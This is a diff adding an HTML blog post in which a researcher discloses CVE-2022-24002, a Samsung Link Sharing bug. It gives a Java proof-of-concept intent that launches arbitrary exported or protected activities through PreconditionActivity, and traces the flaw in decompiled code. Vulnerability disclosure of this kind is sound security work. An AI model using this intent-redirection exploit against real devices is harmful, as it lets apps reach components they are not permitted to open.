@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>CVE-2022-24002 - Samsung Link Sharing Start Any Activity | YayWebsiteYay (I suck at titles)</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="CVE-2022-24002 - Samsung Link Sharing Start Any Activity" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:" />
+<meta property="og:description" content="In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:" />
+<link rel="canonical" href="http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html" />
+<meta property="og:url" content="http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html" />
+<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-02-11T10:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CVE-2022-24002 - Samsung Link Sharing Start Any Activity" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"CVE-2022-24002 - Samsung Link Sharing Start Any Activity","dateModified":"2022-02-11T10:00:00-05:00","datePublished":"2022-02-11T10:00:00-05:00","url":"http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html"},"description":"In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/cves/cve-2021-25374">CVE-2021-25374 Details</a><a class="page-link" href="/cves/cve-2022-22288">CVE-2022-22288 Details</a><a class="page-link" href="/cves/">My CVEs</a><a class="page-link" href="/published-research/">Published Research</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">CVE-2022-24002 - Samsung Link Sharing Start Any Activity</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-02-11T10:00:00-05:00" itemprop="datePublished">Feb 11, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:</p>
+
+<ul>
+  <li>Any exported activity</li>
+  <li>Any protected activity within the Link Sharing application</li>
+</ul>
+
+<p>I submitted this bug to Samsung but they said someone else already reported it. Today Samsung publicly disclosed the CVE ID for this issue, and credit goes to Dawuge of Pangu Team. I guess it is safe for me to disclose my PoC for it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent intent = new Intent();
+intent.setComponent(new ComponentName("com.samsung.android.app.simplesharing", "com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity"));
+
+Intent intent2 = new Intent();
+intent2.setComponent(new ComponentName("com.sec.android.app.sbrowser", "com.sec.android.app.sbrowser.SBrowserLauncherActivity")); // replace with any other target component
+intent2.setData(Uri.parse("https://www.f-secure.com"));
+intent2.putExtra("yay", "boo");
+
+Bundle bundle = new Bundle();
+bundle.putInt("extra_request_code", 9001);
+bundle.putParcelable("extra_former_intent", intent2);
+
+intent.putExtras(bundle);
+
+startActivity(intent);
+</code></pre></div></div>
+
+<h2 id="technical-details">Technical Details</h2>
+
+<p>When <code class="language-plaintext highlighter-rouge">PreConditionActivity</code> is opened, the Intent is passed onto <code class="language-plaintext highlighter-rouge">com.samsung.android.app.simplesharing.presentation.precondition.PreconditionViewModel.handlePrecondition(intent)</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package com.samsung.android.app.simplesharing.presentation.precondition;
+
+public final class PreconditionActivity extends AppCompatActivity {
+
+    public void onCreate(Bundle bundle) {
+        AndroidInjection.inject(this);
+        ...
+        PreconditionViewModel viewModel = getViewModel();
+        ...
+        viewModel.handlePrecondition(intent);
+    }
+
+    public final PreconditionViewModel getViewModel() {
+        return (PreconditionViewModel) this.viewModel$delegate.getValue();
+    }
+</code></pre></div></div>
+<p>The Intent is processed, and the parcelable extra <code class="language-plaintext highlighter-rouge">extra_former_intent</code> is stored in the variable <code class="language-plaintext highlighter-rouge">formerIntent</code>. This variable can then be called via the method <code class="language-plaintext highlighter-rouge">getFormerIntent()</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package com.samsung.android.app.simplesharing.presentation.precondition;
+
+public final class PreconditionViewModel extends AndroidViewModel {
+
+    private Intent formerIntent;
+
+    public final void handlePrecondition(Intent intent) {
+        if (!this.isInit) {
+            this.isInit = true;
+            if (isFromSdk(intent)) {
+                this.callerType = CallerType.TYPE_SDK;
+                if (enforceShowPermissionNotice()) {
+                    setShouldEnforceShowPermissionNotice();
+                } else {
+                    setShouldRequestPermission();
+                }
+            } else if (isOptionalContactRequest(intent)) {
+                setShouldRequestContactPermission();
+            } else if (isOptionalCameraRequest(intent)) {
+                setShouldRequestCameraPermission();
+            } else {
+                Intent intent2 = (Intent) intent.getParcelableExtra("extra_former_intent");
+                this.formerIntent = intent2;
+                ...
+    }
+
+    public final Intent getFormerIntent() {
+        return this.formerIntent;
+    }
+</code></pre></div></div>
+
+<p>Going back to the class <code class="language-plaintext highlighter-rouge">com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity</code>, the method <code class="language-plaintext highlighter-rouge">startFormalIntentActivity()</code> is called which then retrieves the variable <code class="language-plaintext highlighter-rouge">formerIntent</code> via <code class="language-plaintext highlighter-rouge">getFormerIntent()</code>, and then calls class <code class="language-plaintext highlighter-rouge">com.samsung.android.app.simplesharing.presentation.common.util.NavigatorUtil</code> method <code class="language-plaintext highlighter-rouge">startActivityFromFormerIntent(Activity, Intent)</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package com.samsung.android.app.simplesharing.presentation.precondition;
+
+public final class PreconditionActivity extends AppCompatActivity {
+
+    public final void startFormalIntentActivity() {
+        if (getViewModel().isProcessRestart()) {
+            NavigatorUtil.startHistoryActivity$default(NavigatorUtil.INSTANCE, this, false, null, 6, null);
+        } else {
+            Intent formerIntent = getViewModel().getFormerIntent();
+            if (formerIntent != null) {
+                NavigatorUtil.INSTANCE.startActivityFromFormerIntent(this, formerIntent);
+            }
+        }
+        finishWithSuccess();
+    }
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">formerIntent</code> is finally passed to <code class="language-plaintext highlighter-rouge">startActivity(Activity, Intent)</code>, where the component in the <code class="language-plaintext highlighter-rouge">formerIntent</code> is used to start a new activity:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package com.samsung.android.app.simplesharing.presentation.common.util;
+
+public final class NavigatorUtil {
+
+    public final void startActivityFromFormerIntent(Activity activity, Intent intent) {
+        Intent copyIntent = copyIntent(intent);
+        if (intent.getClipData() != null) {
+            copyIntent.setClipData(intent.getClipData());
+            copyIntent.addFlags(1);
+        }
+        INSTANCE.startActivity(activity, copyIntent);
+    }
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/research/2022/02/11/samsung-link-sharing-start-any-activity.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:nah">nah</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Sometimes I want to publish stuff unfiltered.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
